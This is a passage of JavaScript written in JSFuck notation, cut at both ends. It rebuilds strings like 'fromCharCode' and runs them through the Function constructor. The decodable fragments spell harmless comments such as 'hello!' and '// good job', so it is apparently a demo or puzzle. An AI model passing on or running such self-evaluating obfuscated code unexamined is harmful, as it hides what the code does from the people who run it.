+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(+(+!![]+(!![]+[])[!![]+!![]+!![]]+(+!![])+(+[])+(+[])+(+[]))+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(![]+[])[+[]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(+[]+[]))()[!![]+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()((+!![]+[])[(![]+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]]]())[!![]+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[+[]]+(![]+[])[+!![]]+(!![]+[])[+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()((+!![]+[])[(![]+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]]]())[!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[!![]+!![]]+(!![]+[])[!![]+!![]+!![]]]((!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[]),(!![]+!![]+!![]+!![]+[])+(!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])))()+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]]+([][[]]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()(&#123;&#125;)[+[]]+(!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]))+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(+(+!![]+(!![]+[])[!![]+!![]+!![]]+(+!![])+(+[])+(+[])+(+[]))+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(![]+[])[+[]]+([]+[])[(![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]()[(+!![]+[])+(!![]+!![])]+([]+[])[(![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]()[(+!![]+[])+(!![]+!![])])()[!![]+!![]+!![]+!![]+!![]])()[(![]+[])[+[]]+(!![]+[])[+!![]]+(&#123;&#125;+[])[+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(+(+!![]+(!![]+[])[!![]+!![]+!![]]+(+!![])+(+[])+(+[])+(+[]))+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+(![]+[])[+[]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(+[]+[]))()[!![]+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()((+!![]+[])[(![]+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]]]())[!![]+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[+[]]+(![]+[])[+!![]]+(!![]+[])[+!![]]+[][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]]+(![]+[])[!![]+!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+([][(![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+!![]]][(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+(&#123;&#125;+[])[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+(!![]+[])[!![]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[!![]+!![]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!![]+!![]]+(&#123;&#125;+[])[+!![]]+(&#123;&#125;+[])[!![]+!![]+!![]+!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!![]+!![]+!![]+!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[+!![]])()+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]+!![]])()((+!![]+[])[(![]+[])[!![]+!![]+!![]]+(!![]+[])[!![]+!![]]+(&#123;&#125;+[])[!![]+!![]]]())[!![]+!![]]+(&#123;&#125;+[])[+!![]]+([][[]]+[])[!![]+!![]]+(!![]+[])[!![]+!![]+!![]]]((!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(+!![]+[]),(+!![]+[])+(+!![]+[])+(+!![]+[]),(+!![]+[])+(+[]+[])+(+[]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+!![]+[])+(+!![]+[]),(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(+!![]+[])+(+[]+[])+(+!![]+[]),(+!![]+[])+(+!![]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+[]),(+!![]+[])+(+[]+[])+(!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[]),(!![]+!![]+!![]+!![]+!![]+